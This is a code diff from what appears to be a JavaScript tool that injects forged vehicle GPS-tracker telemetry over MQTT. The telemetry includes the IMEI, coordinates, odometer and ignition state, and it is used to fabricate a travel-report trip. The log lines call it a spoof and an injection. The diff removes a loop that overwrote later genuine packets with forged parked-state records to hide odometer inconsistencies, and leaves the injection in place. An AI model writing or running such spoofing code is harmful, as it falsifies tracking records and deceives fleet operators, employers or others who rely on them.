@@ -442,39 +442,7 @@ async function runTravelReport(imei, date_str, target_hours = 1.5, speed = 30, l
                 client.publish(topic, end_payload);
                 
                 // Overwrite subsequent original packets to prevent odometer drops
-                 const final_time_ms = final_time.getTime();
-                 const subsequent_records = history_data.filter(r => {
-                     const t = new Date(r.dt.replace(' ', 'T') + "Z").getTime();
-                     return t > final_time_ms;
-                 });
-                 
-                 if (subsequent_records.length > 0) {
-                     logCallback(`[+] Overwriting ${subsequent_records.length} subsequent packets to prevent odometer drops...`);
-                     for (const r of subsequent_records) {
-                         const time_str = r.dt;
-                         const lat = parseFloat(r.lat || 0);
-                         const lng = parseFloat(r.lng || 0);
-                         const coord_str = `+${lat.toFixed(6)},+${lng.toFixed(6)}`;
-                         
-                         const odo_str = `${curr_odo.toFixed(3)}-${curr_today_odo.toFixed(3)}`;
-                         
-                         const p_count = r.pack_count ? parseInt(r.pack_count) : curr_pack_count;
-                         const p_bat = r.battery ? parseFloat(r.battery).toFixed(1) : v_battery;
-                         const p_overspeed = r.overspeed || v_overspeed;
-                         
-                         // Force parked state: Ignition OFF (0), Speed 0, JCB OFF
-                         const p_jcb = "0-0-0-0";
-                         const p_speed = 0;
-                         const p_ign = 0;
-                         const p_status = "1-0-0-0-0";
-                         const p_jcb_bit = 0;
-                         
-                         const payload = `##,${imei},0,${time_str},${coord_str},${p_speed},${p_bat},0,${p_ign},91.26,${odo_str},${p_overspeed},0-0,0-0,+0.0,0,${p_jcb},2000-00-00 00:00:00,2000-00-00 00:00:00,12,3950,0,${p_status},0,0,0-0,0,0,${p_count},${p_jcb_bit},0-26,3950,${p_jcb_bit},0,0,0,00000-00,$`;
-                         
-                         client.publish(topic, payload);
-                         await new Promise(res => setTimeout(res, 50));
-                     }
-                 }
+                // (Disabled: Do not overwrite any packets after the spoof ends)
                 
                 logCallback(`[+] Successfully injected Travel Report Trip!`);
                 logCallback(`[+] Sent final Ignition OFF packet to conclude the trip.`);
